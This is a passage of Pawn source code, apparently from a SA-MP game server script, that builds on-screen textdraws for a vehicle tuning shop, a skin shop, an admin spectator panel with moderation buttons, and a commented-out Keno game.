	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][6], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][6], 2);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][6], 0);

	TuningBuy[playerid][7] = CreatePlayerTextDraw(playerid, 513.500488, 270.611999, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][7], 146.000000, 14.759970);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][7], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][7], -1606664961);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][7], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][7], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][7], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][7], 0);
	PlayerTextDrawSetSelectable(playerid, TuningBuy[playerid][7], true);

	TuningBuy[playerid][8] = CreatePlayerTextDraw(playerid, 623.800781, 259.562500, "BUY");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][8], 0.507000, 0.987500);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][8], 3);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][8], -1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][8], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][8], 3);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][8], 0);

	TuningBuy[playerid][9] = CreatePlayerTextDraw(playerid, 513.500488, 258.425811, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][9], 137.000000, 1.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][9], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][9], 505328895);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][9], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][9], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][9], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][9], 0);

	TuningBuy[playerid][10] = CreatePlayerTextDraw(playerid, 512.900634, 270.026519, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][10], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][10], 137.000000, 1.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][10], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][10], 505328895);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][10], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][10], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][10], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][10], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][10], 0);

	TuningBuy[playerid][11] = CreatePlayerTextDraw(playerid, 625.500244, 273.112365, "CANCEL");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][11], 0.507000, 0.987500);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][11], 3);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][11], -1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][11], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][11], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][11], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][11], 3);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][11], 1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][11], 0);

	TuningBuy[playerid][12] = CreatePlayerTextDraw(playerid, 512.800659, 285.389984, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][12], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][12], 142.000000, 6.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][12], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][12], 505328895);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][12], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][12], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][12], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][12], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][12], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][12], 0);

	TuningBuy[playerid][13] = CreatePlayerTextDraw(playerid, 523.500488, 246.986999, "LD_BEAT:LEFT");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][13], 16.000000, 10.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][13], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][13], -1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][13], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][13], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][13], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][13], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][13], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][13], 0);
	PlayerTextDrawSetSelectable(playerid, TuningBuy[playerid][13], true);

	TuningBuy[playerid][14] = CreatePlayerTextDraw(playerid, 617.077636, 246.986999, "LD_BEAT:RIGHT");
	PlayerTextDrawLetterSize(playerid, TuningBuy[playerid][14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TuningBuy[playerid][14], 16.000000, 10.000000);
	PlayerTextDrawAlignment(playerid, TuningBuy[playerid][14], 1);
	PlayerTextDrawColor(playerid, TuningBuy[playerid][14], -1);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][14], 0);
	PlayerTextDrawSetOutline(playerid, TuningBuy[playerid][14], 0);
	PlayerTextDrawBackgroundColor(playerid, TuningBuy[playerid][14], 255);
	PlayerTextDrawFont(playerid, TuningBuy[playerid][14], 4);
	PlayerTextDrawSetProportional(playerid, TuningBuy[playerid][14], 0);
	PlayerTextDrawSetShadow(playerid, TuningBuy[playerid][14], 0);
	PlayerTextDrawSetSelectable(playerid, TuningBuy[playerid][14], true);
	
	SkinTD[0] = CreatePlayerTextDraw(playerid, 240.298889, 395.212768, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SkinTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SkinTD[0], 187.000000, 72.000000);
	PlayerTextDrawAlignment(playerid, SkinTD[0], 1);
	PlayerTextDrawColor(playerid, SkinTD[0], 255);
	PlayerTextDrawSetShadow(playerid, SkinTD[0], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[0], 255);
	PlayerTextDrawFont(playerid, SkinTD[0], 4);
	PlayerTextDrawSetProportional(playerid, SkinTD[0], 0);
	PlayerTextDrawSetShadow(playerid, SkinTD[0], 0);

	SkinTD[1] = CreatePlayerTextDraw(playerid, 183.198822, 395.062438, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, SkinTD[1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SkinTD[1], 104.000000, 85.000000);
	PlayerTextDrawAlignment(playerid, SkinTD[1], 1);
	PlayerTextDrawColor(playerid, SkinTD[1], 505290495);
	PlayerTextDrawSetShadow(playerid, SkinTD[1], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[1], 255);
	PlayerTextDrawFont(playerid, SkinTD[1], 4);
	PlayerTextDrawSetProportional(playerid, SkinTD[1], 0);
	PlayerTextDrawSetShadow(playerid, SkinTD[1], 0);

	SkinTD[2] = CreatePlayerTextDraw(playerid, 375.899078, 394.750000, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, SkinTD[2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SkinTD[2], 104.000000, 85.000000);
	PlayerTextDrawAlignment(playerid, SkinTD[2], 1);
	PlayerTextDrawColor(playerid, SkinTD[2], 505290495);
	PlayerTextDrawSetShadow(playerid, SkinTD[2], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[2], 255);
	PlayerTextDrawFont(playerid, SkinTD[2], 4);
	PlayerTextDrawSetProportional(playerid, SkinTD[2], 0);
	PlayerTextDrawSetShadow(playerid, SkinTD[2], 0);

	SkinTD[3] = CreatePlayerTextDraw(playerid, 235.598815, 396.025024, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SkinTD[3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SkinTD[3], 187.000000, 72.000000);
	PlayerTextDrawAlignment(playerid, SkinTD[3], 1);
	PlayerTextDrawColor(playerid, SkinTD[3], 505290495);
	PlayerTextDrawSetShadow(playerid, SkinTD[3], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[3], 255);
	PlayerTextDrawFont(playerid, SkinTD[3], 4);
	PlayerTextDrawSetProportional(playerid, SkinTD[3], 0);
	PlayerTextDrawSetShadow(playerid, SkinTD[3], 0);

	SkinTD[4] = CreatePlayerTextDraw(playerid, 215.098815, 414.837524, "LD_BEAT:LEFT");
	PlayerTextDrawLetterSize(playerid, SkinTD[4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SkinTD[4], 26.000000, 20.000000);
	PlayerTextDrawAlignment(playerid, SkinTD[4], 1);
	PlayerTextDrawColor(playerid, SkinTD[4], 1347440895);
	PlayerTextDrawSetShadow(playerid, SkinTD[4], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[4], 255);
	PlayerTextDrawFont(playerid, SkinTD[4], 4);
	PlayerTextDrawSetProportional(playerid, SkinTD[4], 0);
	PlayerTextDrawSetShadow(playerid, SkinTD[4], 0);
	PlayerTextDrawSetSelectable(playerid, SkinTD[4], true);

	SkinTD[5] = CreatePlayerTextDraw(playerid, 411.610839, 414.837524, "LD_BEAT:RIGHT");
	PlayerTextDrawLetterSize(playerid, SkinTD[5], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SkinTD[5], 26.000000, 20.000000);
	PlayerTextDrawAlignment(playerid, SkinTD[5], 1);
	PlayerTextDrawColor(playerid, SkinTD[5], 1347440895);
	PlayerTextDrawSetShadow(playerid, SkinTD[5], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[5], 255);
	PlayerTextDrawFont(playerid, SkinTD[5], 4);
	PlayerTextDrawSetProportional(playerid, SkinTD[5], 0);
	PlayerTextDrawSetShadow(playerid, SkinTD[5], 0);
	PlayerTextDrawSetSelectable(playerid, SkinTD[5], true);

	SkinTD[6] = CreatePlayerTextDraw(playerid, 326.000000, 419.250000, "Price:_$1,000,000");
	PlayerTextDrawLetterSize(playerid, SkinTD[6], 0.375999, 1.127500);
	PlayerTextDrawAlignment(playerid, SkinTD[6], 2);
	PlayerTextDrawColor(playerid, SkinTD[6], -1);
	PlayerTextDrawSetShadow(playerid, SkinTD[6], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[6], -1);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[6], 255);
	PlayerTextDrawFont(playerid, SkinTD[6], 2);
	PlayerTextDrawSetProportional(playerid, SkinTD[6], 1);
	PlayerTextDrawSetShadow(playerid, SkinTD[6], 0);

	SkinTD[7] = CreatePlayerTextDraw(playerid, 225.000000, 438.062500, "BUY");
	PlayerTextDrawTextSize(playerid, SkinTD[7], 30.0, 30.0);
	PlayerTextDrawLetterSize(playerid, SkinTD[7], 0.375999, 1.127500);
	PlayerTextDrawAlignment(playerid, SkinTD[7], 2);
	PlayerTextDrawColor(playerid, SkinTD[7], 1018445055);
	PlayerTextDrawSetShadow(playerid, SkinTD[7], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[7], -1);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[7], 255);
	PlayerTextDrawFont(playerid, SkinTD[7], 2);
	PlayerTextDrawSetProportional(playerid, SkinTD[7], 1);
	PlayerTextDrawSetShadow(playerid, SkinTD[7], 0);
	PlayerTextDrawSetSelectable(playerid, SkinTD[7], true);

	SkinTD[8] = CreatePlayerTextDraw(playerid, 434.500000, 437.187500, "CANCEL");
	PlayerTextDrawLetterSize(playerid, SkinTD[8], 0.375999, 1.127500);
	PlayerTextDrawTextSize(playerid, SkinTD[8], 30.0, 30.0);
	PlayerTextDrawAlignment(playerid, SkinTD[8], 2);
	PlayerTextDrawColor(playerid, SkinTD[8], -1271120641);
	PlayerTextDrawSetShadow(playerid, SkinTD[8], 0);
	PlayerTextDrawSetOutline(playerid, SkinTD[8], -1);
	PlayerTextDrawBackgroundColor(playerid, SkinTD[8], 255);
	PlayerTextDrawFont(playerid, SkinTD[8], 2);
	PlayerTextDrawSetProportional(playerid, SkinTD[8], 1);
	PlayerTextDrawSetShadow(playerid, SkinTD[8], 0);
	PlayerTextDrawSetSelectable(playerid, SkinTD[8], true);
	
	SpecTD[0] = CreatePlayerTextDraw(playerid, 491.000000, 145.375000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SpecTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SpecTD[0], 141.000000, 190.000000);
	PlayerTextDrawAlignment(playerid, SpecTD[0], 1);
	PlayerTextDrawColor(playerid, SpecTD[0], -1);
	PlayerTextDrawSetShadow(playerid, SpecTD[0], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[0], 255);
	PlayerTextDrawFont(playerid, SpecTD[0], 4);
	PlayerTextDrawSetProportional(playerid, SpecTD[0], 0);
	PlayerTextDrawSetShadow(playerid, SpecTD[0], 0);

	SpecTD[1] = CreatePlayerTextDraw(playerid, 491.500000, 145.812500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SpecTD[1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SpecTD[1], 140.000000, 188.219879);
	PlayerTextDrawAlignment(playerid, SpecTD[1], 1);
	PlayerTextDrawColor(playerid, SpecTD[1], 505290495);
	PlayerTextDrawSetShadow(playerid, SpecTD[1], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[1], 255);
	PlayerTextDrawFont(playerid, SpecTD[1], 4);
	PlayerTextDrawSetProportional(playerid, SpecTD[1], 0);
	PlayerTextDrawSetShadow(playerid, SpecTD[1], 0);

	SpecTD[2] = CreatePlayerTextDraw(playerid, 562.500000, 155.137481, "Deathwing._(3,0)_");
	PlayerTextDrawLetterSize(playerid, SpecTD[2], 0.208999, 0.865000);
	PlayerTextDrawAlignment(playerid, SpecTD[2], 2);
	PlayerTextDrawColor(playerid, SpecTD[2], -1);
	PlayerTextDrawSetShadow(playerid, SpecTD[2], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[2], 255);
	PlayerTextDrawFont(playerid, SpecTD[2], 1);
	PlayerTextDrawSetProportional(playerid, SpecTD[2], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[2], 0);

	SpecTD[3] = CreatePlayerTextDraw(playerid, 561.499755, 165.800018, "PARANTEZELE_SUNT_REPREZENTATE_ASTFEL:~N~(Level,_Ore_jucate)");
	PlayerTextDrawLetterSize(playerid, SpecTD[3], 0.194999, 0.515000);
	PlayerTextDrawAlignment(playerid, SpecTD[3], 2);
	PlayerTextDrawColor(playerid, SpecTD[3], -1);
	PlayerTextDrawSetShadow(playerid, SpecTD[3], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[3], 255);
	PlayerTextDrawFont(playerid, SpecTD[3], 1);
	PlayerTextDrawSetProportional(playerid, SpecTD[3], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[3], 0);

	SpecTD[4] = CreatePlayerTextDraw(playerid, 623.500000, 148.437500, "Menu Spectator (/spec)");
	PlayerTextDrawLetterSize(playerid, SpecTD[4], 0.233499, 0.536875);
	PlayerTextDrawAlignment(playerid, SpecTD[4], 3);
	PlayerTextDrawColor(playerid, SpecTD[4], -1);
	PlayerTextDrawSetShadow(playerid, SpecTD[4], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[4], 255);
	PlayerTextDrawFont(playerid, SpecTD[4], 2);
	PlayerTextDrawSetProportional(playerid, SpecTD[4], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[4], 0);

	SpecTD[5] = CreatePlayerTextDraw(playerid, 560.500000, 188.824981, "KICK");
	PlayerTextDrawTextSize(playerid, SpecTD[5], 15.0, 15.0);
	PlayerTextDrawLetterSize(playerid, SpecTD[5], 0.398999, 0.895625);
	PlayerTextDrawAlignment(playerid, SpecTD[5], 2);
	PlayerTextDrawColor(playerid, SpecTD[5], -1271778561);
	PlayerTextDrawSetShadow(playerid, SpecTD[5], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[5], 255);
	PlayerTextDrawFont(playerid, SpecTD[5], 2);
	PlayerTextDrawSetProportional(playerid, SpecTD[5], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[5], 0);
	PlayerTextDrawSetSelectable(playerid, SpecTD[5], true);

	SpecTD[6] = CreatePlayerTextDraw(playerid, 560.500000, 210.262481, "JAIL");
	PlayerTextDrawLetterSize(playerid, SpecTD[6], 0.398999, 0.895625);
	PlayerTextDrawTextSize(playerid, SpecTD[6], 15.0, 15.0);
	PlayerTextDrawAlignment(playerid, SpecTD[6], 2);
	PlayerTextDrawColor(playerid, SpecTD[6], -1271778561);
	PlayerTextDrawSetShadow(playerid, SpecTD[6], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[6], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[6], 255);
	PlayerTextDrawFont(playerid, SpecTD[6], 2);
	PlayerTextDrawSetProportional(playerid, SpecTD[6], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[6], 0);
	PlayerTextDrawSetSelectable(playerid, SpecTD[6], true);

	SpecTD[7] = CreatePlayerTextDraw(playerid, 561.000000, 232.137481, "BAN");
	PlayerTextDrawTextSize(playerid, SpecTD[7], 15.0, 15.0);
	PlayerTextDrawLetterSize(playerid, SpecTD[7], 0.398999, 0.895625);
	PlayerTextDrawAlignment(playerid, SpecTD[7], 2);
	PlayerTextDrawColor(playerid, SpecTD[7], -1271778561);
	PlayerTextDrawSetShadow(playerid, SpecTD[7], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[7], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[7], 255);
	PlayerTextDrawFont(playerid, SpecTD[7], 2);
	PlayerTextDrawSetProportional(playerid, SpecTD[7], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[7], 0);
	PlayerTextDrawSetSelectable(playerid, SpecTD[7], true);

	SpecTD[8] = CreatePlayerTextDraw(playerid, 561.000000, 253.137481, "WARN");
	PlayerTextDrawTextSize(playerid, SpecTD[8], 15.0, 15.0);
	PlayerTextDrawLetterSize(playerid, SpecTD[8], 0.398999, 0.895625);
	PlayerTextDrawAlignment(playerid, SpecTD[8], 2);
	PlayerTextDrawColor(playerid, SpecTD[8], -1271778561);
	PlayerTextDrawSetShadow(playerid, SpecTD[8], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[8], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[8], 255);
	PlayerTextDrawFont(playerid, SpecTD[8], 2);
	PlayerTextDrawSetProportional(playerid, SpecTD[8], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[8], 0);
	PlayerTextDrawSetSelectable(playerid, SpecTD[8], true);

	SpecTD[9] = CreatePlayerTextDraw(playerid, 561.500000, 270.199981, "JAIL_(DM/DB)");
	PlayerTextDrawTextSize(playerid, SpecTD[9], 15.0, 15.0);
	PlayerTextDrawLetterSize(playerid, SpecTD[9], 0.398999, 0.895625);
	PlayerTextDrawAlignment(playerid, SpecTD[9], 2);
	PlayerTextDrawColor(playerid, SpecTD[9], -1271778561);
	PlayerTextDrawSetShadow(playerid, SpecTD[9], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[9], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[9], 255);
	PlayerTextDrawFont(playerid, SpecTD[9], 2);
	PlayerTextDrawSetProportional(playerid, SpecTD[9], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[9], 0);
	PlayerTextDrawSetSelectable(playerid, SpecTD[9], true);

	SpecTD[10] = CreatePlayerTextDraw(playerid, 563.000000, 293.862670, "BAN_(CHEATS)");
	PlayerTextDrawTextSize(playerid, SpecTD[10], 15.0, 15.0);
	PlayerTextDrawLetterSize(playerid, SpecTD[10], 0.398999, 0.895625);
	PlayerTextDrawAlignment(playerid, SpecTD[10], 2);
	PlayerTextDrawColor(playerid, SpecTD[10], -1271778561);
	PlayerTextDrawSetShadow(playerid, SpecTD[10], 0);
	PlayerTextDrawSetOutline(playerid, SpecTD[10], 0);
	PlayerTextDrawBackgroundColor(playerid, SpecTD[10], 255);
	PlayerTextDrawFont(playerid, SpecTD[10], 2);
	PlayerTextDrawSetProportional(playerid, SpecTD[10], 1);
	PlayerTextDrawSetShadow(playerid, SpecTD[10], 0);
	PlayerTextDrawSetSelectable(playerid, SpecTD[10], true);
	
	/*KenoTD[0] = CreatePlayerTextDraw(playerid, 131.500000, 121.750000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[0], 412.000000, 226.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[0], 1);
	PlayerTextDrawColor(playerid, KenoTD[0], 154798335);
	PlayerTextDrawSetShadow(playerid, KenoTD[0], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[0], 255);
	PlayerTextDrawFont(playerid, KenoTD[0], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[0], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[0], 0);

	KenoTD[1] = CreatePlayerTextDraw(playerid, 286.000000, 123.500000, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, KenoTD[1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[1], 126.000000, 30.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[1], 1);
	PlayerTextDrawColor(playerid, KenoTD[1], 92751615);
	PlayerTextDrawSetShadow(playerid, KenoTD[1], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[1], 255);
	PlayerTextDrawFont(playerid, KenoTD[1], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[1], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[1], 0);

	KenoTD[2] = CreatePlayerTextDraw(playerid, 292.000000, 125.250000, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, KenoTD[2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[2], 115.000000, 26.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[2], 1);
	PlayerTextDrawColor(playerid, KenoTD[2], 154798335);
	PlayerTextDrawSetShadow(playerid, KenoTD[2], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[2], 255);
	PlayerTextDrawFont(playerid, KenoTD[2], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[2], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[2], 0);

	KenoTD[3] = CreatePlayerTextDraw(playerid, 297.000000, 128.312500, "KENO");
	PlayerTextDrawLetterSize(playerid, KenoTD[3], 0.466499, 1.770624);
	PlayerTextDrawAlignment(playerid, KenoTD[3], 1);
	PlayerTextDrawColor(playerid, KenoTD[3], -53605121);
	PlayerTextDrawSetShadow(playerid, KenoTD[3], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[3], 255);
	PlayerTextDrawFont(playerid, KenoTD[3], 1);
	PlayerTextDrawSetProportional(playerid, KenoTD[3], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[3], 0);

	KenoTD[4] = CreatePlayerTextDraw(playerid, 336.500000, 134.875000, "Universe");
	PlayerTextDrawLetterSize(playerid, KenoTD[4], 0.409500, 1.044373);
	PlayerTextDrawAlignment(playerid, KenoTD[4], 1);
	PlayerTextDrawColor(playerid, KenoTD[4], -53605121);
	PlayerTextDrawSetShadow(playerid, KenoTD[4], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[4], 255);
	PlayerTextDrawFont(playerid, KenoTD[4], 0);
	PlayerTextDrawSetProportional(playerid, KenoTD[4], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[4], 0);

	KenoTD[5] = CreatePlayerTextDraw(playerid, 339.500000, 125.250000, "]");
	PlayerTextDrawLetterSize(playerid, KenoTD[5], 0.402498, 1.022500);
	PlayerTextDrawAlignment(playerid, KenoTD[5], 1);
	PlayerTextDrawColor(playerid, KenoTD[5], -169597185);
	PlayerTextDrawSetShadow(playerid, KenoTD[5], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[5], 255);
	PlayerTextDrawFont(playerid, KenoTD[5], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[5], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[5], 0);

	KenoTD[6] = CreatePlayerTextDraw(playerid, 364.500000, 127.000000, "]");
	PlayerTextDrawLetterSize(playerid, KenoTD[6], 0.515497, 1.219372);
	PlayerTextDrawAlignment(playerid, KenoTD[6], 1);
	PlayerTextDrawColor(playerid, KenoTD[6], -169597185);
	PlayerTextDrawSetShadow(playerid, KenoTD[6], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[6], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[6], 255);
	PlayerTextDrawFont(playerid, KenoTD[6], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[6], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[6], 0);

	KenoTD[7] = CreatePlayerTextDraw(playerid, 358.000000, 142.862426, "]");
	PlayerTextDrawLetterSize(playerid, KenoTD[7], 0.379000, 0.759998);
	PlayerTextDrawAlignment(playerid, KenoTD[7], 1);
	PlayerTextDrawColor(playerid, KenoTD[7], -169597185);
	PlayerTextDrawSetShadow(playerid, KenoTD[7], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[7], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[7], 255);
	PlayerTextDrawFont(playerid, KenoTD[7], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[7], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[7], 0);

	KenoTD[8] = CreatePlayerTextDraw(playerid, 220.099884, 159.812500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[8], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[8], 267.000000, 155.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[8], 1);
	PlayerTextDrawColor(playerid, KenoTD[8], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[8], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[8], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[8], 255);
	PlayerTextDrawFont(playerid, KenoTD[8], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[8], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[8], 0);

	KenoTD[9] = CreatePlayerTextDraw(playerid, 220.600006, 160.750030, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[9], 266.000000, 153.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[9], 1);
	PlayerTextDrawColor(playerid, KenoTD[9], 154798335);
